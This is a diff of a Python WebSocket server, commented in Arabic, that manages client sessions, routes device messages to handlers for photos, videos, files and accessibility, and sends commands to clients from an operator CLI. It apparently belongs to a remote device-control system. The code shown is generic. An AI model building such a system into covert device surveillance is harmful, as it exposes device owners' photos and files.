@@ -8,13 +8,14 @@ websocket_server.py
 المسؤوليات:
   1. تشغيل خادم WebSocket على host:port.
   2. قبول الاتصالات الجديدة وإنشاء جلسة لكل عميل.
-  3. استقبال الرسائل وتمريرها إلى SessionManager.
-  4. إرسال الأوامر إلى العملاء.
-  5. إغلاق الاتصالات بشكل نظيف.
+  3. استقبال الرسائل وتمريرها إلى SessionManager (للتوجيه).
+  4. تمرير الرسائل أيضاً إلى ClientSession (لطابور CLI).
+  5. إرسال الأوامر إلى العملاء.
+  6. إغلاق الاتصالات بشكل نظيف.
 
 يعتمد على:
   - websockets (مكتبة Python)
-  - SessionManager (إدارة الجلسات)
+  - SessionManager (إدارة الجلسات + التوجيه)
   - utils.logger (التسجيل)
 
 الاستخدام:
@@ -36,8 +37,9 @@ from websockets.exceptions import ConnectionClosed
 
 from core.session_manager import SessionManager
 from core.client_session import ClientSession
+from utils.logger import get_logger, truncate
 
-logger = logging.getLogger("websocket_server")
+logger = get_logger("websocket_server")
 
 
 class WebSocketServer:
@@ -93,7 +95,6 @@ class WebSocketServer:
             ping_interval=self.ping_interval,
             ping_timeout=self.ping_timeout,
             max_size=self.max_message_size,
-            # عدم قطع الاتصال عند عدم وجود رسائل
             close_timeout=10,
         )
 
@@ -133,11 +134,11 @@ class WebSocketServer:
         session: Optional[ClientSession] = None
 
         try:
-            # -------- 1. إنشاء جلسة جديدة --------
+            # ----- 1. إنشاء جلسة جديدة -----
             session = await self.session_manager.create_session(websocket, client_addr)
             logger.info(f"Session created: {session.client_id}")
 
-            # -------- 2. حلقة استقبال الرسائل --------
+            # ----- 2. حلقة استقبال الرسائل -----
             async for raw_message in websocket:
                 await self._on_message(session, raw_message)
 
@@ -151,7 +152,7 @@ class WebSocketServer:
             logger.exception(f"Unexpected error in client handler: {e}")
 
         finally:
-            # -------- 3. تنظيف الجلسة --------
+            # ----- 3. تنظيف الجلسة -----
             if session is not None:
                 await self.session_manager.remove_session(session.client_id)
                 logger.info(f"Session removed: {session.client_id}")
@@ -164,31 +165,57 @@ class WebSocketServer:
     async def _on_message(self, session: ClientSession, raw_message: str) -> None:
         """
         يُستدعى عند وصول رسالة من العميل.
+
+        الخطوات:
+          1. تجاهل الفارغ.
+          2. تحليل JSON.
+          3. تمرير إلى ClientSession (طابور CLI + HELLO handling).
+          4. تمرير إلى SessionManager (توجيه للمعالجات).
         """
-        # تجاهل الرسائل الفارغة
+        # ----- 1. تجاهل الفارغ -----
         if not raw_message or not raw_message.strip():
             logger.debug("Empty message received, ignoring")
             return
 
-        # محاولة تحليل JSON
+        # ----- 2. تحليل JSON -----
         try:
             msg = json.loads(raw_message)
         except json.JSONDecodeError as e:
             logger.warning(f"Invalid JSON from {session.client_id}: {e}")
             return
 
-        # تحديث آخر نشاط للجلسة
+        if not isinstance(msg, dict):
+            logger.warning(f"Message is not a dict from {session.client_id}")
+            return
+
+        # ----- 3. تحديث آخر نشاط -----
         session.touch()
 
-        # تسجيل مختصر
+        # ----- 4. تسجيل مختصر -----
         msg_type = msg.get("type", "?")
         msg_cmd = msg.get("cmd", "")
         logger.debug(
             f"[{session.client_id}] ← type={msg_type} cmd={msg_cmd}"
         )
 
-        # تمرير الرسالة إلى الجلسة (التي بدورها تمررها لـ CLI)
-        await session.on_message(msg)
+        # ============================================
+        # 5. تمرير إلى ClientSession
+        # ============================================
+        # هذا يُحدّث device_info عند HELLO، ويضع الرسالة في طابور CLI
+        try:
+            await session.on_message(msg)
+        except Exception as e:
+            logger.exception(f"session.on_message error: {e}")
+
+        # ============================================
+        # 6. تمرير إلى SessionManager (توجيه)
+        # ============================================
+        # هذا يُوجّه الرسالة إلى المعالج المناسب
+        # (photos, videos, files, accessibility)
+        try:
+            await self.session_manager.route_message(session.client_id, msg)
+        except Exception as e:
+            logger.exception(f"route_message error: {e}")
 
     # ============================================================
     # 5. إرسال أمر إلى عميل محدد
@@ -202,15 +229,10 @@ class WebSocketServer:
         إرسال أمر إلى عميل محدد عبر SessionManager.
 
         :param client_id: معرف العميل
-        :param command: الأمر كقاموس Python (سيُحوّل إلى JSON)
+        :param command: الأمر كقاموس Python
         :return: True إذا تم الإرسال بنجاح
         """
-        session = self.session_manager.get_session(client_id)
-        if session is None:
-            logger.warning(f"Client not found: {client_id}")
-            return False
-
-        return await session.send_command(command)
+        return await self.session_manager.send_command(client_id, command)
 
     # ============================================================
     # 6. بث أمر لجميع العملاء
@@ -218,7 +240,7 @@ class WebSocketServer:
     async def broadcast(
         self,
         command: dict,
-        exclude: Optional[list[str]] = None,
+        exclude: Optional[list] = None,
     ) -> int:
         """
         بث أمر لجميع العملاء النشطين.
@@ -227,17 +249,7 @@ class WebSocketServer:
         :param exclude: قائمة client_id للاستثناء
         :return: عدد العملاء الذين تم الإرسال لهم
         """
-        exclude = exclude or []
-        count = 0
-
-        for session in self.session_manager.get_all_sessions():
-            if session.client_id in exclude:
-                continue
-            if await session.send_command(command):
-                count += 1
-
-        logger.info(f"Broadcast sent to {count} client(s)")
-        return count
+        return await self.session_manager.broadcast(command, exclude)
 
     # ============================================================
     # 7. حالة الخادم
@@ -265,7 +277,8 @@ class WebSocketServer:
         """
         try:
             if websocket.remote_address:
-                host, port = websocket.remote_address[0], websocket.remote_address[1]
+                host = websocket.remote_address[0]
+                port = websocket.remote_address[1]
                 return f"{host}:{port}"
         except Exception:
             pass
